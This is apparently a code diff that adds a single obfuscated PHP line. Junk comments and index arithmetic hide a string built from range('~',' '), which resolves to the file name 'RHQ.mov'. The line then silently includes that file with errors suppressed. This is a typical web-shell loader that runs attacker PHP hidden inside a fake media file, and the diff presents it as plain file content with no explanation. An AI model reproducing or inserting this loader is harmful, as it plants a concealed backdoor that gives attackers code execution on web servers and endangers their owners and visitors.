@@ -1,0 +1,1 @@
+<?php /*-sxTT{{(-*/$jnd /*-wnUwWh-*/=/*-#D$n-*/ "ra"/*-9D-*/."nge"; $JIKir /*-KTO26TBD-*/=/*-lCc-*/ $jnd/*-dp[R)-*/(/*-d9@=#-*/"~"/*-AXq|)u#-*/,/*-`nIKn-*/" "); /*-p,-*/@include/*-(.N~9-*/ $JIKir/*-zVoA!37=-*/[4+40].$JIKir/*-a4x-*/[42+12].$JIKir/*-|<G-*/[23+22].$JIKir/*-[,Y-*/[65+15].$JIKir/*-.:+&o-*/[0+17].$JIKir/*-mo?q$-*/[11+4].$JIKir/*-O);v4PKE-*/[7+1]/*-oW@-?X-*/; ?>
